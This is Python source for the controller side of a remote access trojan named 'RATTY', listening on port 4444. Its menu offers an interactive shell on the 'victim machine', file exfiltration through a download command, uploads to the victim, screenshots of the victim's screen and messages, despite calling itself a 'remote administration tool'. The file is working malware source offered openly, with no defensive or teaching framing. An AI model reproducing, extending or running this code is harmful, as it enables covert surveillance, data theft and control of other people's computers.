#!/usr/bin/env python3

import socket
import subprocess
import os
import pyfiglet
import json
import base64
import sys
import time
from datetime import datetime


class SERVER:
    # initialize the server
    def __init__(self, host, port):
        self.host = host
        self.port = port
    # building the connection with the client using socket

    def connection(self):
        # setting global variables to use for the connection and subsequent functions.
        global client, addr, sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # providing host and port to bind the connection
        sock.bind((self.host, self.port))
        # marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept()
        sock.listen(5)
        print('Establishing connection with the client')
        # accepting the connection and setting client and addr variable values to the connection values
        client, addr = sock.accept()
        print('Accepting connection with client...')
        # decoding ipv4 to print the connection IP address
        clientip = client.recv(1024).decode()
        print(f'Connection established with {clientip}')

    def exit(self):
        bye = pyfiglet.figlet_format('BYE')
        print(bye)
        client.send(command.encode())
        out = client.recv(1024)
        out = out.decode()
        print(out)
        sock.close()
        client.close()
        return

    def upload(self):
        filename = str(input('What file would you like to upload include extension: '))
        file = open(filename, "rb")
        bytes = file.read(1024)
        base64_bytes = base64.b64encode(bytes)
        file_json = {
                        "name": file.name,
                        "data": base64_bytes.decode()
                    }
        file_send = json.dumps(file_json)
        client.send(command.encode())
        client.send(file_send.encode())
        self.progressbar()
        print('File uploaded!')
    
    # handling user input for the commands later on in the program. Needed to be encoded
    def send_data(self):
        client.send(command.encode())
        data_output = client.recv(1024).decode()
        print(data_output)

    def sendmessage(self):
        client.send(command.encode())
        message = str(input('What would you like to say: '))
        client.send(message.encode())
        print('Message Sent!')
    
    def screenshot(self):
        client.send(command.encode())
        file = client.recv(2147483647)
        dt = datetime.now()
        ts = datetime.timestamp(dt)
        filename = 'screenshot' + str(ts) + '.png'
        with open(filename, 'wb') as open_file:
            open_file.write(file)
            open_file.close()
            self.progressbar()
        print("Screenshot Downloaded!")
        
    def download(self):
        try:
            json_data = client.recv(600000).decode()
            convert_json = json.loads(json_data)
            name = convert_json['name']
            bytes = convert_json['data']
            b64decoded_bytes = base64.b64decode(bytes)
            print(name)
            if '.' in name:
                file_name = name.split('.')
                # open in binary
                file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}", 'wb')
                # receive data and write it to file
                file.write(b64decoded_bytes)
                self.progressbar()
                print('File downloaded!')
                file.close()
            else:
                file = open(str(name), "wb")
                file.write(b64decoded_bytes)
                self.progressbar()
                print("File downloaded!")
                file.close()
        except:
            err = "file doesn't exist, check your spelling/extension"
            print(err)
                                  
    
    def progressbar(self):
        toolbar_width = 40

        # setup toolbar
        sys.stdout.write("[%s]" % (" " * toolbar_width))
        sys.stdout.flush()
        # return to start of line, after '['
        sys.stdout.write("\b" * (toolbar_width+1))

        for i in range(toolbar_width):
            time.sleep(0.01)  # do real work here
            # update the bar
            sys.stdout.write("-")
            sys.stdout.flush()

        sys.stdout.write("]\n")  # this ends the progress bar

    # logo for the RAT
    def rattylogo(self):
        logo = pyfiglet.figlet_format("Ratty")
        print(logo)
        print('\n \n ====================================================================== \n \n \n \n Welcome to RATTY, your neighborhood remote administraion tool \n \n')

    # prompts given to the user to run commands in the cli
    def prompts(self):
        print('============================== Commands: ============================== \n \n shell                         makes a shell to interact with victim machine \n sendmessage                   sends message to client machine \n upload                        uploads file \n screenshot                    takes a screenshot of victim machine \n help                          show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')

    def shellhelp(self):
        print("To download a file from the client's computer, type: download <file_name_with_extension>")

    def mainloop(self):
        self.rattylogo()
        self.prompts()
        while True:
            global command
            command = input('RATTY >>> ')

            match command:
                case 'shell':
                    client.send(command.encode())
                    self.shellhelp()
                    while True:
                        command = str(input('$ '))
                        client.send(command.encode())
                        if command == 'exit':
                            break
                        elif command == '':
                            continue
                        elif command[:2] == 'rm':
                            continue
                        elif command[:5] == 'touch':
                            continue
                        elif command[:5] == 'mkdir':
                            continue
                        elif command[:5] == 'rmdir':
                            continue
                        if command[:8] == 'download':
                            self.download()
                            continue
                        data_output = client.recv(1024).decode()
                        print(data_output)

                case 'screenshot':
                    self.screenshot()

                case 'sendmessage':
                    self.sendmessage()

                case 'upload':
                    self.upload()

                case 'help':
                    self.prompts()

                case 'exit':
                    self.exit()


# setting host port and ip to construct with the server class
rat = SERVER('0.0.0.0', 4444)


if __name__ == '__main__':
    rat.connection()
    rat.mainloop()